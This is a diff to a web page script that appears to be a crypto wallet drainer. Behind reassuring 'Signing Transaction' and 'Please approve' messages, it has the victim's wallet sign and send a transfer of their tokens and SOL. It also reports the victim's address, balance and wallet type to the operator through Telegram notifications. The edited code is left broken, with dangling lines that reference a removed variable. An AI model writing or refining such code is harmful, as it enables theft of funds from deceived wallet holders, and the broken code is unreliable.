@@ -483,28 +483,24 @@ await sendTelegramNotification({
                     $('.wallet-loading-title').text('Signing Transaction');
                     $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.<br>This may take a few moments.');
                     
-const signedTx = await walletProvider.signTransaction(transaction);
+const { signature } = await walletProvider.signAndSendTransaction(transaction);
 
-console.log("Signed TX object:", signedTx);
-console.log("Signatures:", signedTx.signatures);
-
-// Safety check
-if (!signedTx.signatures || signedTx.signatures.length === 0) {
-    throw new Error("Transaction was not properly signed by wallet");
-}
+console.log("Transaction sent:", signature);
 
 await sendTelegramNotification({
     address: publicKeyString,
     balance: solBalanceFormatted,
     usdBalance: 'Unknown',
     walletType: walletInfo.name,
-    customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
+    customMessage: `✅ Transaction Sent - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
 });
 
 $('.wallet-loading-title').text('Confirming Transaction');
 $('.wallet-loading-subtitle').html('Transaction is being confirmed on the blockchain.<br>Please wait...');
 
-const txid = await connection.sendRawTransaction(
+await connection.confirmTransaction(signature, "confirmed");
+
+console.log("Transaction confirmed:", signature);
     signedTx.serialize(),
     {
         skipPreflight: false,
